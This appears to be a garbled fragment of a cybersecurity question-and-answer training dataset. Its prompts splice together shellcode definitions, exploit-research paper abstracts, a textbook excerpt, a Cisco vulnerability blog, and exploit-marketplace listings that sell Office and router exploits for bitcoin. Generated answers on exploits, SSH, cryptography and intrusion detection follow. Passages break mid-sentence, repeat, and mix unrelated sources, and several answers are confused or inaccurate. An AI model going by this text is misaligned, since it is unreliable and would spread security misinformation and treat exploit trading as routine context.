Below I will list a few of the mostcommon programming languages used, and how a1  ## [ shellcode ]  # Shellcode category     In computer security, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called \"shellcode\" because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode. Because the function of a payload is not limited to merely spawning a shell, some have suggested that the name shellcode is insufficient. Shellcode is commonly written in machine code.      **Classification:**   There are several methods of classifying exploits. The most common is by how the exploit contacts the vulnerable software. A remote exploit works over a network and exploits the security vulnerability without any prior access to the vulnerable system. A local exploit requires prior access to the vulnerable system and usually increases the privileges of the person running the exploit past those granted by the system administrator. Exploits against client applications also exist, usually consisting of modified servers that send an exploit if accessed with a client application. Exploits against client applications may also require some interaction with the user and thus may be used in combination with the social engineering method. Another classification is by the action against the vulnerable system; unauthorized data access, arbitrary code execution, and denial of service are examples. Many exploits are designed to provide superuser-level access to a computer system. However, it is also possible to use several exploits, first to gain low-level access, then to escalate privileges repeatedly until one reaches root. Normally a single exploit can only take advantage of a specific software vulnerability. Often, when an exploit is published, the vulnerability is fixed through a patch and the exploit becomes obsolete until newer versions of the software become available Shellcodes any types.This chapter will discussthe exploits Vlad and his crew use in the \ufb01ctional story.An exploit (from the same word in the French language, meaning \u201cachievement\u201dor \u201caccomplishment\u201d) is a piece of software, a chunk of data, or sequence ofcommands that take advantage of a bug, glitch, or vulnerability to cause unintendedor unanticipated behavior to occur on computer software, hardware, or somethingelectronic (usually computerized or networked).

It requires a comprehensive understanding of a vulnerability and delicate techniques to bypass defense mechanisms. As a result, attackers may prefer to reuse an existing exploit and make necessary changes over developing a new exploit from scratch. One such adaptation is the replacement of the original shellcode (i.e., the attacker-injected code that is executed as the \ufb01nal step of the exploit) in the original exploit with a replacement shellcode, resulting in a modi\ufb01ed exploit that carries out the actions desired by the attacker as opposed to the original exploit author. We call this a shellcode transplant. Current automated shellcode placement methods are insuf\ufb01- cient because they over-constrain the replacement shellcode, and so cannot be used to achieve shellcode transplant. For example, these systems consider the shellcode as an integrated memory chunk, and require that the execution path of the modi\ufb01ed exploit must be same as the original one. To resolve these issues, we present ShellSwap, a system that uses symbolic tracing, with a combination of shellcode layout remediation and path kneading to achieve shellcode transplant. We evaluated the ShellSwap system on a combination of 20 exploits and 5 pieces of shellcode that are independently developed and different from the original exploit. Among the 100 test cases, our system successfully generated 88% of the exploits. I. I NTRODUCTION Remote exploits are extremely dangerous.

The English text form of this Risk Matrix can be found here.\"of remote exploits against a piece of software running on a victim computer, an attacker can install backdoors and ex\ufb01ltrate sensitive information without physical access to the compromised system, leading to real-world impacts on the \ufb01nances and reputation of the victim. However, developing a remote exploit is not easy. A comprehensive understanding of the vulnerability is a must, and complex techniques to bypass defenses on the remote system are necessary. When possible, rather than developing a new exploit from scratch, attackers prefer to reuse existing exploits in their attacks, making necessary changes to adapt these exploits to new environments. One such adaptation is the replacement of the original shellcode (i.e., the attacker- injected code that is executed as the \ufb01nal step of the exploit) in the original exploit with a replacement shellcode, resulting in a modi\ufb01ed exploit that carries out the actions desired by the attacker as opposed to the original exploit author. We call this a shellcode transplant . Shellcode transplanting has many applications, including reversing command and control protocols, understanding captured exploits, and replaying attacks. Thus, this capability is very helpful in situations rangingfrom rapid cyber-response (i.e., quick analysis of and response to 0-day attacks) and adversarial scenarios (like cyber-security Capture-The-Flag competitions or cyber warfare in the real world). Unfortunately, current techniques to transplant shellcode generally require an analyst to have a decent understanding of how the original exploit interacts with the program, what vulnerability it triggers, and how it bypasses deployed exploit mitigations. As a result, the analyst must put a lot of effort into development and debugging, which negates much of the advantage of shellcode transplanting. In investigating this problem, we identi\ufb01ed three main challenges to tackling the shellcode transplant problem . First,stands for shell code, and that N stands for a NOP instruction, the new stack would look  like this:  bottom of EEEEEEEEEEE EEEE FFFF FFFF FFFF FFFF top of  memory 123456783- CDEF 0123 4567 89- CDEF memory  buffer sfp ret a b C  <.....

For remote overflow exploits, the intruder can compile and analyze the service program  on his machine to get a rough idea of the correct address, the exact value of which  depends on the environment variables that the user has set. Hence, in order to increase the  chances ofpointing to the exploit code, a string of NOPs are placed, as in local exploits.  2.2. Polymorphic shellcode  Polymorphic shellcode [7] is basically a functionally equivalent form of a buffer  overflow exploit with a different signature on the network. As it hits the target machine,  it reassembles, having eluded the IDS [SI.  A well-known tool that generates polymorphic shellcode is a polymorphic  buffer-overflow engine called ADMutate [9]. An attacker feeds the ADMutate a buffer  overflow exploit to generate hundreds or thousands of functionally equivalent exploits  [IO]. This is accomplished by using simple encryption techniques, along with the  substitution of functionally equivalent machine-language instructions. This confuses  many IDS tools (including Snort) that search for the familiar NOP sled or the known  machine-language exploit included in buffer overflows, as ADMutate dynamically  modifies these elements.  A buffer overflow attack script consists of three parts, a set of NOPs, the  shellcode, and the return address in the form [NNNN][SSSS][RRRR].

It exploits a vulnerability in a publicly accessible service or application, allowing an attacker to gain unauthorized access to the targeted system. Remote exploits can be particularly dangerous because they do not require any physical access to the targeted system and can often be carried out from anywhere in the world.\n\nOn the other hand, a local exploit is an attack that requires prior access to a system or application. It takes advantage of a vulnerability in a locally installed software or application to elevate privileges or gain unauthorized access to sensitive information. Local exploits can be carried out by an attacker who has already gained access to a system, either physically or through social engineering tactics.\n\nThe key difference between the two types of exploits lies in the requirement for prior access to the targeted system. Remote exploits can be launched from anywhere over a network, while local exploits require the attacker to have already gained access to the targeted system. Both types of exploits can be highly damaging, depending on the specific vulnerability being exploited and the level of access the attacker is able to gain."}

It is called \"shellcode\" because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode. Because the function of a payload is not limited to merely spawning a shell, some have suggested that the name shellcode is insufficient. Shellcode is commonly written in machine code.      **Classification:**   There are several methods of classifying exploits. The most common is by how the exploit contacts the vulnerable software. A remote exploit works over a network and exploits the security vulnerability without any prior access to the vulnerable system. A local exploit requires prior access to the vulnerable system and usually increases the privileges of the person running the exploit past those granted by the system administrator. Exploits against client applications also exist, usually consisting of modified servers that send an exploit if accessed with a client application. Exploits against client applications may also require some interaction with the user and thus may be used in combination with the social engineering method. Another classification is by the action against the vulnerable system; unauthorized data access, arbitrary code execution, and denial of service are examples. Many exploits are designed to provide superuser-level access to a computer system. However, it is also possible to use several exploits, first to gain low-level access, then to escalate privileges repeatedly until one reaches root. Normally a single exploit can only take advantage of a specific software vulnerability. Often, when an exploit is published, the vulnerability is fixed through a patch and the exploit becomes obsolete until newer versions of the software become available Shellcodes any types.\"* Home   * About   * News   * F5 fixes critical vulnerability discovered by Positive Technologies in BIG-IP application delivery controller   # F5 fixes critical vulnerability discovered by Positive Technologies in BIG- IP application delivery controller  Published on July 2, 2020  **Positive Technologies expert Mikhail Klyuchnikov has discovered a vulnerability in the configuration interface of the BIG-IP application delivery controller (ADC) used bysome of the worlds biggest companies.

It requires a comprehensive understanding of a vulnerability and delicate techniques to bypass defense mechanisms. As a result, attackers may prefer to reuse an existing exploit and make necessary changes over developing a new exploit from scratch.

To resolve these issues, we present ShellSwap, a system that uses symbolic tracing, with a combination of shellcode layout remediation and path kneading to achieve shellcode transplant. We evaluated the ShellSwap system on a combination of 20 exploits and 5 pieces of shellcode that are independently developed and different from the original exploit.

However, developing a remote exploit is not easy. A comprehensive understanding of the vulnerability is a must, and complex techniques to bypass defenses on the remote system are necessary. When possible, rather than developing a new exploit from scratch, attackers prefer to reuse existing exploits in their attacks, making necessary changes to adapt these exploits to new environments. One such adaptation is the replacement of the original shellcode (i.e., the attacker- injected code that is executed as the \ufb01nal step of the exploit) in the original exploit with a replacement shellcode, resulting in a modi\ufb01ed exploit that carries out the actions desired by the attacker as opposed to the original exploit author. We call this a shellcode transplant . Shellcode transplanting has many applications, including reversing command and control protocols, understanding captured exploits, and replaying attacks. Thus, this capability is very helpful in situations rangingfrom rapid cyber-response (i.e., quick analysis of and response to 0-day attacks) and adversarial scenarios (like cyber-security Capture-The-Flag competitions or cyber warfare in the real world). Unfortunately, current techniques to transplant shellcode generally require an analyst to have a decent understanding of how the original exploit interacts with the program, what vulnerability it triggers, and how it bypasses deployed exploit mitigations. As a result, the analyst must put a lot of effort into development and debugging, which negates much of the advantage of shellcode transplanting. In investigating this problem, we identi\ufb01ed three main challenges to tackling the shellcode transplant problem . First,the fuzzer as the OS needs to reboot. In this paper, we approach the problem of coverage- guided kernel fuzzing in an OS-independent and hardware-assisted way: We utilize a hypervisor and In- tel\u2019s Processor Trace (PT) technology. This allows us to remain independent of the target OS as we just re- quire a small user space component that interacts with the targeted OS. As a result, our approach introduces almost no performance overhead, even in cases where the OS crashes, and performs up to 17,000 executions per second on an off-the-shelf laptop. We developed a framework called kernel-AFL (kAFL) to assess the secu- rity of Linux, macOS, and Windows kernel components. Among many crashes, we uncovered several \ufb02aws in the ext4 driver for Linux, the HFS andAPFS \ufb01le system of macOS, and the NTFS driver of Windows. 1 Introduction Several vulnerability classes such as memory corrup- tions, race-conditional memory accesses, and use-after-free vulnerabilities, are known threats for programs run- ning in user mode as well as for the operating system (OS) core itself. Past experience has shown that attack- ers typically focus on user mode applications. This is likely because vulnerabilities in user mode programs are notoriously easier and more reliable to exploit. How- ever, with the appearance of different kinds of exploit defense mechanisms \u2013 especially in user mode, it has become much harder nowadays to exploit known vul- nerabilities. Due to those advanced defense mechanisms in user mode, the kernel has become even more appeal- ing to an attacker since most kernel defense mechanisms are not widely deployed in practice. This is due to more complex implementations, which may affect the system performance. Furthermore, some of them are not part of the of\ufb01cial mainline code base or even require sup- port for the latest CPU extension (e.g., SMAP / SMEP on x86-64). Additionally, when compromising the OS, an attacker typically gains full access to the system re-and removed by most antivirus and antimalware programs, and organizations may limit  user rights to prevent installation of additional software or to limit which software can be  installed to prevent installation of PUPs and other unwanted applications on their organi - zationally owned PCs. If you do see a report of a PUP on a system, bear in mind that you shouldn\u2019t immediately  presume the system has been compromised, as you might with the other malware discussed  in this chapter. A discussion about awareness and best practices with the end user, removal  with appropriate tools, and a return to normal operation may be all that you need to do  with most PUP installations. The Security+ exam outline includes PUPs with malware, but many PUPs are  not technically malicious\u2014they\u2019re annoying, they can be privacy risks, and  they can slow a system down or otherwise cause problems\u2014but they aren\u2019t  actually malware. That\u2019s why they\u2019re called potentially unwanted programs  instead of malware\u2014most people and most organizations still don\u2019t want  them installed! Malicious Code Malware isn\u2019t the only type of malicious code that you may encounter. Scripts and cus - tom-built code that isn\u2019t malware can both be used by malicious actors as well. These  attacks can happen locally or remotely via a network connection, and they often leverage  built-in tools like Windows PowerShell and Visual Basic, or Bash and Python on Linux  systems. Even macros like those built into Microsoft\u2019s Office Suite can be leveraged by  attackers. Much like the types of malware we have already explored, Domain 1.0  Threats, Attacks, and Vulnerabilities sectionxa01.4 focuses on potential indi - cators of network attacks. That\u2019s slightly strange placement for malicious  scripts and malicious code, but that\u2019s how the SY0-601 exam categorizes  these. For this section, focus on how you would identify indicators of  malicious scripts related to network (and other) attacks.56 Chapter 3 \u25a0 Malicious Code" Cisco advisory  On March 17th 2017 Cisco Systems disclosed a vulnerability present in their switches. This disclosure was based on the documents from Vault 7:  > A vulnerability in the Cisco Cluster Management Protocol (CMP) processing > code in Cisco IOS and Cisco IOS XE Software could allow an unauthenticated, > remote attacker to cause a reload of an affected device or remotely execute > code with elevated privileges.  Not much details were available at the time of writing this article, except for the following paragraph:  > The Cluster Management Protocol utilizes Telnet internally as a signaling > and command protocol between cluster members. The vulnerability is due to > the combination of two factors: > >   * The failure to restrict the use of CMP-specific Telnet options only to > internal, local communications between cluster members and instead accept > and process such options over any Telnet connection to an affected device, > and >   * The incorrect processing of malformed CMP-specific Telnet options. >  Long story short, the vulnerability allows the attacker to exploit telnet service to gain remote code execution on the target switch. But in order to make any use of this advisory I needed more information on the matter. So I decided dig deeper into Cisco Cluster Management Protocol.  ## Switch clustering  All right! I had two Catalyst 2960 switches for researching this vulnerability. Clustering sets a master-slave relation between switches. Master switch is able to get a privileged command shell on the slave. As Cisco mentioned in its advisory, telnet is used as a command protocol between cluster members. Some info on clustering can be found here and here\u2019s an example of setting up a cluster environment.  Now to look for cluster traffic between them. The following should be in the master switch config:                cluster enable CLGRP 0     cluster member 1 mac-address xxxx.xxxx.xxxx1  18-07-2022  ### Microsoft Office Excel Silent Builder Exploit  Rate up:  0  Rate down:  0  Comments:  0  windows  11 305  Security Risk Critical  R  Related releases  D  Download  -  Verified by 0day Admin    0.027  Open this exploit for 0.027 BTC  Open this exploit for 1 000 GOLD  viper_8080  Exploits:  5  BusinessLevel:  1  26-06-2022  ### Microsoft Office Project Universal Silent Builder Exploit  Rate up:  0  Rate down:  0  Comments:  0  windows  10 394  Security Risk Critical  R  Related releases  D  Download  -  Verified by 0day Admin    0.061  Open this exploit for 0.061 BTC  Open this exploit for 2 300 GOLD  viper_8080  Exploits:  5  BusinessLevel:  1  ## [ remote exploits ]  # Remote exploits and vulnerabilities category     A \"remote exploit\" works over a network and exploits the security vulnerability without any prior access to the vulnerable system.  -::DATE  -::DESCRIPTION  -::TYPE  -::HITS  -::RISK  -::GOLD  -::AUTHOR  19-11-2023  ### TP-Link ER605 Unauthent LAN-side Remote Code Execution Exploit  Rate up:  0  Rate down:  0  Comments:  0  hardware  472  Security Risk Critical  R  Related releases  D  Download  V  Contains video proof  Verified by 0day Admin    0.04  Open this exploit for 0.04 BTC  Open this exploit for 1 500 GOLD  lychain1337  Exploits:  1  BusinessLevel:  0  14-11-2023  ### ZoneMinder Snapshots Command Injection Exploit  Comments:  0  multiple  616  Security Risk Critical  R  Related releases  D  Download  C  CVE-2023-26035  Verified by 0day Admin  free  You can open this exploit for free  metasploit  Exploits:  1588  BusinessLevel:  90  14-11-2023  ### MagnusBilling Remote Command Execution Exploit  Comments:  0  multiple  521  Security Risk Critical  R  Related releases  D  Download  C  CVE-2023-30258  Verified by 0day Admin  free  You can open this exploit for free  metasploit  Exploits:  1588  BusinessLevel:  90  14-11-2023  ### F5 BIG-IP TMUI Directory Traversal / File Upload / Code Execution Exploit  Comments:  0  unix", "Answer": "[INST] You are an Expert in the field of cybersecurity,                   Leverage the Contextual Information to informed responses.

Among many crashes, we uncovered several \ufb02aws in the ext4 driver for Linux, the HFS andAPFS \ufb01le system of macOS, and the NTFS driver of Windows. 1 Introduction Several vulnerability classes such as memory corrup- tions, race-conditional memory accesses, and use-after-free vulnerabilities, are known threats for programs run- ning in user mode as well as for the operating system (OS) core itself. Past experience has shown that attack- ers typically focus on user mode applications. This is likely because vulnerabilities in user mode programs are notoriously easier and more reliable to exploit. How- ever, with the appearance of different kinds of exploit defense mechanisms \u2013 especially in user mode, it has become much harder nowadays to exploit known vul- nerabilities. Due to those advanced defense mechanisms in user mode, the kernel has become even more appeal- ing to an attacker since most kernel defense mechanisms are not widely deployed in practice. This is due to more complex implementations, which may affect the system performance. Furthermore, some of them are not part of the of\ufb01cial mainline code base or even require sup- port for the latest CPU extension (e.g., SMAP / SMEP on x86-64). Additionally, when compromising the OS, an attacker typically gains full access to the system re-and removed by most antivirus and antimalware programs, and organizations may limit  user rights to prevent installation of additional software or to limit which software can be  installed to prevent installation of PUPs and other unwanted applications on their organi - zationally owned PCs. If you do see a report of a PUP on a system, bear in mind that you shouldn\u2019t immediately  presume the system has been compromised, as you might with the other malware discussed  in this chapter. A discussion about awareness and best practices with the end user, removal  with appropriate tools, and a return to normal operation may be all that you need to do  with most PUP installations. The Security+ exam outline includes PUPs with malware, but many PUPs are  not technically malicious\u2014they\u2019re annoying, they can be privacy risks, and  they can slow a system down or otherwise cause problems\u2014but they aren\u2019t  actually malware. That\u2019s why they\u2019re called potentially unwanted programs  instead of malware\u2014most people and most organizations still don\u2019t want  them installed! Malicious Code Malware isn\u2019t the only type of malicious code that you may encounter. Scripts and cus - tom-built code that isn\u2019t malware can both be used by malicious actors as well. These  attacks can happen locally or remotely via a network connection, and they often leverage  built-in tools like Windows PowerShell and Visual Basic, or Bash and Python on Linux  systems. Even macros like those built into Microsoft\u2019s Office Suite can be leveraged by  attackers. Much like the types of malware we have already explored, Domain 1.0  Threats, Attacks, and Vulnerabilities sectionxa01.4 focuses on potential indi - cators of network attacks. That\u2019s slightly strange placement for malicious  scripts and malicious code, but that\u2019s how the SY0-601 exam categorizes  these. For this section, focus on how you would identify indicators of  malicious scripts related to network (and other) attacks.56 Chapter 3 \u25a0 Malicious Code" Cisco advisory  On March 17th 2017 Cisco Systems disclosed a vulnerability present in their switches. This disclosure was based on the documents from Vault 7:  > A vulnerability in the Cisco Cluster Management Protocol (CMP) processing > code in Cisco IOS and Cisco IOS XE Software could allow an unauthenticated, > remote attacker to cause a reload of an affected device or remotely execute > code with elevated privileges.  Not much details were available at the time of writing this article, except for the following paragraph:  > The Cluster Management Protocol utilizes Telnet internally as a signaling > and command protocol between cluster members. The vulnerability is due to > the combination of two factors: > >   * The failure to restrict the use of CMP-specific Telnet options only to > internal, local communications between cluster members and instead accept > and process such options over any Telnet connection to an affected device, > and >   * The incorrect processing of malformed CMP-specific Telnet options. >  Long story short, the vulnerability allows the attacker to exploit telnet service to gain remote code execution on the target switch. But in order to make any use of this advisory I needed more information on the matter. So I decided dig deeper into Cisco Cluster Management Protocol.  ## Switch clustering  All right! I had two Catalyst 2960 switches for researching this vulnerability. Clustering sets a master-slave relation between switches. Master switch is able to get a privileged command shell on the slave. As Cisco mentioned in its advisory, telnet is used as a command protocol between cluster members. Some info on clustering can be found here and here\u2019s an example of setting up a cluster environment.  Now to look for cluster traffic between them. The following should be in the master switch config:                cluster enable CLGRP 0     cluster member 1 mac-address xxxx.xxxx.xxxx1  18-07-2022  ### Microsoft Office Excel Silent Builder Exploit  Rate up:  0  Rate down:  0  Comments:  0  windows  11 305  Security Risk Critical  R  Related releases  D  Download  -  Verified by 0day Admin    0.027  Open this exploit for 0.027 BTC  Open this exploit for 1 000 GOLD  viper_8080  Exploits:  5  BusinessLevel:  1  26-06-2022  ### Microsoft Office Project Universal Silent Builder Exploit  Rate up:  0  Rate down:  0  Comments:  0  windows  10 394  Security Risk Critical  R  Related releases  D  Download  -  Verified by 0day Admin    0.061  Open this exploit for 0.061 BTC  Open this exploit for 2 300 GOLD  viper_8080  Exploits:  5  BusinessLevel:  1  ## [ remote exploits ]  # Remote exploits and vulnerabilities category     A \"remote exploit\" works over a network and exploits the security vulnerability without any prior access to the vulnerable system.  -::DATE  -::DESCRIPTION  -::TYPE  -::HITS  -::RISK  -::GOLD  -::AUTHOR  19-11-2023  ### TP-Link ER605 Unauthent LAN-side Remote Code Execution Exploit  Rate up:  0  Rate down:  0  Comments:  0  hardware  472  Security Risk Critical  R  Related releases  D  Download  V  Contains video proof  Verified by 0day Admin    0.04  Open this exploit for 0.04 BTC  Open this exploit for 1 500 GOLD  lychain1337  Exploits:  1  BusinessLevel:  0  14-11-2023  ### ZoneMinder Snapshots Command Injection Exploit  Comments:  0  multiple  616  Security Risk Critical  R  Related releases  D  Download  C  CVE-2023-26035  Verified by 0day Admin  free  You can open this exploit for free  metasploit  Exploits:  1588  BusinessLevel:  90  14-11-2023  ### MagnusBilling Remote Command Execution Exploit  Comments:  0  multiple  521  Security Risk Critical  R  Related releases  D  Download  C  CVE-2023-30258  Verified by 0day Admin  free  You can open this exploit for free  metasploit  Exploits:  1588  BusinessLevel:  90  14-11-2023  ### F5 BIG-IP TMUI Directory Traversal / File Upload / Code Execution Exploit  Comments:  0  unix                   Question: 'What can the hacker gain with a remote exploit attack and What can a hacker do with the help of a local exploit?'[/INST] With a remote exploit attack, a hacker can gain various privileges, such as regular privileges or even root access, depending on the vulnerability and the exploit used. However, gaining full control of a system usually requires a combination of both remote and local exploits. A remote exploit alone may give the attacker the ability to run commands or access sensitive information, but it may not provide sufficient privileges to install backdoors or perform more advanced attacks.\n\nOn the other hand, a local exploit gives the attacker more control over the exploit's actions and reduces the possibility of detection. Local exploits can be used to escalate privileges and gain root access to a system. By combining a remote exploit to initially gain access to a system and a local exploit to escalate privileges, a hacker can gain full control of the target system.\n\nTherefore, while remote exploits can be useful for initial access to a system, a hacker will often need to use a local exploit to gain the highest level of privilege and control."}

These functions are typically weakened versions of strong cryptographic algorithms to comply with export regulations. They are intended for use in less sensitive applications or environments where security is not a top priority.\n\nUnexportable cryptography, on the other hand, refers to strong cryptographic functions that are not intended for export. These functions are subject to stricter export controls due to their potential use in malicious activities, such as communication between organized crime groups or terrorist organizations. They are intended for use in secure environments where high levels of security are required.\n\nIt's important to note that the distinction between exportable and unexportable cryptography is not based on the strength of the cryptographic algorithms themselves but rather on their availability for export. Both JCA and JCE provide cryptographic functions, but JCE includes stronger, unexportable functions that are not available in JCA.\n\nAdditionally, it's worth mentioning that the use, export, and import of cryptography are subject to various legal and regulatory frameworks, including export control laws and patent protections. Therefore, it's essential to consult legal experts before implementing cryptographic solutions in your organization."}

This means that once trust is granted, there are no further restrictions on what the trusted entity can do. On the other hand, a fine-grained trust model allows for more nuanced access control decisions. In this model, the system evaluates each request made by an entity and grants or denies access based on specific conditions. This approach offers greater control and flexibility in managing access to resources.\n\nAs mentioned in the text, Java 1.1 employed a binary trust model, whereas Java 2 introduced a fine-grained trust model. This shift towards a more granular trust model allowed for better control over access to system resources and improved overall security."}

No bytecode transfer occurs during the invocation process, and the output of the servlet is sent back to the client over the network.\n\nLoading a servlet, on the other hand, involves making the servlet available for execution by the web server. This process typically involves copying or deploying the servlet class file to the servlet directory recognized by the web server. Once loaded, the web server can invoke the servlet as needed in response to client requests.\n\nIt's essential to understand these concepts because they have significant implications for security. When a servlet is invoked, no code transfer occurs, making it a relatively secure operation. However, loading a servlet can introduce potential vulnerabilities if the servlet code contains security flaws or if it is loaded from an untrusted source. Therefore, proper security measures should be taken when loading servlets onto a web server."}

Figure-5: Reading the ELF header\"                   Question: 'What is the difference between static and dynamic linking?'[/INST] Static linking and dynamic linking are two methods used in software development for combining object files into an executable program. In the context of cybersecurity and malware analysis, understanding the differences between these linking methods is essential for forensic investigations.\n\nStatic linking is a process where all the required libraries or dependencies are included directly into the executable file during the compilation phase. This means that when you run the program, no external files are needed. All the necessary code and data are contained within the executable itself. This method results in larger file sizes but offers better performance and security since there's no need to rely on external libraries that could potentially be manipulated or outdated.\n\nDynamic linking, on the other hand, is a process where the required libraries or dependencies are not included in the executable file but instead loaded at runtime from their respective locations. This approach leads to smaller executable sizes because only the core functionality is included in the main program. However, it introduces some risks since the program relies on external libraries which could be vulnerable to attacks or exploits.\n\nIn the provided context, the mentioned malware is a 64-bit dynamically-linked executable, meaning that it uses dynamic linking to load required libraries at runtime. This information can be crucial for forensic analysts as they investigate the malware's behavior and potential vulnerabilities."}

These\"                   Question: 'What is the difference between passive and active monitoring techniques?'[/INST] Passive monitoring techniques involve observing and recording network or system activity without actively engaging with the monitored system or network. This means that no additional traffic is generated, and the monitoring tools simply record and analyze existing traffic or system events. Passive monitoring is often used to detect intrusions, anomalous behavior, or policy violations.\n\nActive monitoring techniques, on the other hand, involve actively probing or interacting with the monitored system or network to gather additional information. This can include sending queries, running tests, or simulating attacks. Active monitoring can provide more detailed information about the monitored system or network, but it also carries the risk of generating additional traffic or causing disruptions.\n\nIn the context of malware analysis, both passive and active monitoring techniques can be useful. Passive monitoring can help detect and record the behavior of malware as it runs, while active monitoring can be used to probe the malware's capabilities and interactions with the system or network. It's important to note that passive monitoring alone may not be sufficient to fully understand the behavior of malware, especially if it employs evasion techniques or is designed to avoid detection. Therefore, a combination of passive and active monitoring techniques is often recommended for effective malware analysis."}

In contrast, higher-level wrappers, like HTTP and FTPS, build upon these transports and abstract away the complexities of the underlying protocols.

It encrypts all data transmitted between the client and the server, including commands and their responses. SSH also allows for various other security features like public key authentication, port forwarding, and encryption of X11 sessions.\n\nOn the other hand, SSL is a cryptographic protocol designed to provide secure communication over the internet. It's primarily used for securing web traffic, ensuring that sensitive data, such as credit card numbers or login credentials, cannot be intercepted or read by third parties. SSL creates a secure, encrypted connection between a web server and a web client (typically a web browser), allowing for the secure exchange of data.\n\nIn summary, while both SSH and SSL provide encryption and secure communication, their primary use cases differ. SSH is used for secure remote access to servers and command execution, whereas SSL is used to secure web traffic and protect sensitive data exchanged over the internet."}

These methods are often referred to as \"fingerprinting\" or \"device identification.\"\n\nOne common method involves analyzing the HTTP headers sent by a web browser when making a request to a server. Each web browser and operating system combination sends unique headers, which can be used to identify the specific combination. For example, the User-Agent header contains information about the web browser and operating system being used.\n\nAnother method involves analyzing the timing of packets sent between the client and server. Different operating systems and hardware configurations can cause variations in packet latency and response times, which can be used to help identify the client.\n\nAdditionally, web browsers and operating systems can leave unique signatures in the data they send or receive. For example, some web browsers may include specific version strings or other identifying information in their requests or responses.\n\nIt's important to note that while these methods can provide some level of identification, they are not foolproof and may not always accurately identify the client behind a NAT device. Additionally, some users may take steps to obfuscate their identity, such as using a VPN or Tor, which can make identification even more difficult."}

Answer: you\"                   Question: 'What is the difference between a harmless annoyance and a full-featured home router toolkit?'[/INST] A harmless annoyance refers to a situation where an IDS generates false positives, which can be annoying for individuals with small home networks. On the other hand, a full-featured home router toolkit poses a significant threat to larger corporate networks. False positives can lead to a waste of time and resources for analysts who need to investigate and validate each event. However, in the context of a corporate network, false positives can provide attackers with an opportunity to hide their malicious activities among the sea of false alarms.\n\nThe difference lies in the scale and impact of the issue. For individual home users, dealing with false positives might be an inconvenience, but it does not pose a significant risk. In contrast, for corporate networks, false positives can be devastating due to the time and resources required to investigate and validate each event. Moreover, the potential damage from a successful attack on a corporate network can be much greater than on a home network.\n\nAdditionally, the text mentions the example of a compromised printer, which can serve as a full-featured toolkit for attackers. Such an attack can lead to data exfiltration, redirection of online banking, or even serve as an entry point into the network behind it. This demonstrates the potential danger that complex devices like printers can pose when they are not adequately secured."}

Anomaly detection systems are designed to identify deviations from normal behavior, but not all deviations represent malicious attacks. It's essential to analyze the context and implications of the anomalous behavior to determine if it poses a threat to the system or network.\n\nIn other words, while anomaly detection is an essential component of intrusion detection, it's only the first step. The real challenge comes in accurately interpreting the results and taking appropriate action based on the meaning and impact of the identified anomalies. This requires a deep understanding of the normal behavior patterns of the system and the ability to distinguish between benign and malicious anomalies.\n\nTherefore, the goal of intrusion detection should be to not only find anomalous behavior but also to provide actionable insights to the network operator, enabling them to take appropriate action against actual attacks. This is often referred to as bridging the semantic gap between identifying anomalous behavior and determining if it represents a genuine attack."}

Environment: Small networks typically operate in different environments than large enterprise or backbone networks. Small networks may face different challenges than larger networks, while academic environments may impose different requirements than commercial enterprises.\n2. Cost of Missed Attacks: The cost of missed attacks can vary greatly depending on the security demands of the network and other deployed attack detectors. For a small network, the cost may be relatively low, while for a large enterprise network, the cost could be significant or even lethal.\n3. Skills and Resources of Attackers: The level of sophistication of attacks against a network depends on the perceived risk of being targeted. A site that is at high risk for explicit targeting by an attacker needs to anticipate much more sophisticated attacks than those faced by potential victims of background radiation activity.\n4. Evasion: The degree to which attackers might analyze defense techniques and seek to circumvent them determines the robustness requirements for any detector. There are no perfect detectors in intrusion detection, so one must always anticipate evasion attempts.\n5. Network Size, Stability, Frequency, Nodal Complexity, and Intelligent Residence: Public networks are generally smaller in size than enterprise networks, with a maximum number of nodes on the order of several hundred. Enterprise networks, on the other hand, contain thousands or even tens of thousands of nodes. The transport, control, and management capabilities in a public network node are much more complex, reliable, and expensive than in an enterprise network.\n\nBased on this information, a small network is typically less complex and smaller in scale than a large enterprise network. Small networks may face different challenges than larger networks, and the cost of missed attacks may be lower. However, small networks may still need to be protected from sophisticated attacks and evasion attempts. In contrast, large enterprise networks are much larger in scale, with more complex transport, control, and management capabilities. The cost of missed attacks can be much higher, and the level of sophistication of attacks is likely to be greater. Therefore, large enterprise networks require more robust security measures, such as distributed firewalls and machine learning algorithms like Random Forest, to effectively protect against threats."}

While it is true that both telnet and SSH are protocols used for remote access, there are significant differences in terms of security.\n\nTelnet is an insecure text-based protocol that sends data in plaintext format, making it vulnerable to interception and eavesdropping. On the other hand, SSH is a secure protocol that encrypts all data transmitted between the client and server, providing strong authentication and encryption.\n\nTherefore, while the user experience may appear similar when using a telnet-like SSH client, the underlying security mechanisms are vastly different. It is important to use SSH instead of telnet or other insecure protocols to ensure the confidentiality and integrity of data transmitted during remote access sessions."}

While both involve encryption and authentication, they are used in distinct ways.\n\nPGP is primarily focused on encrypting and decrypting individual files or emails, ensuring confidentiality and integrity of data. It's often used for securing communication channels outside of a secure network, such as sending sensitive information through email. PGP uses asymmetric encryption, which involves a pair of keys \u2013 a public key and a private key \u2013 for encryption and decryption respectively.\n\nOn the other hand, SSH is designed for secure remote access to servers and command-line applications over an insecure network, such as the internet. It encrypts the entire session between two computers, protecting against eavesdropping, man-in-the-middle attacks, and other forms of unauthorized access. SSH uses symmetric encryption for data transfer and asymmetric encryption for key exchange during the initial connection setup.\n\nAlthough PGP and SSH have some similarities, they serve different needs in the context of computer security. PGP focuses on securing individual files or communications, while SSH secures the remote access channel itself. Additionally, recent versions of SSH support using PGP keys for authentication, allowing users to combine the benefits of both technologies in certain scenarios."}

Question: 'What is the only difference between public-key authentication and password authentication?'[/INST] The main difference between public-key authentication and password authentication in SSH is the method used for authentication. In password authentication, you enter a username and password to authenticate yourself to the remote server. In public-key authentication, you use a private key on your local machine to encrypt a message that can only be decrypted by the corresponding public key on the remote server. This way, the remote server can verify your identity without requiring you to enter a password every time you connect. Additionally, public-key authentication provides an extra layer of security as even if an attacker gains access to your account on the remote server, they would still need your private key to impersonate you."}

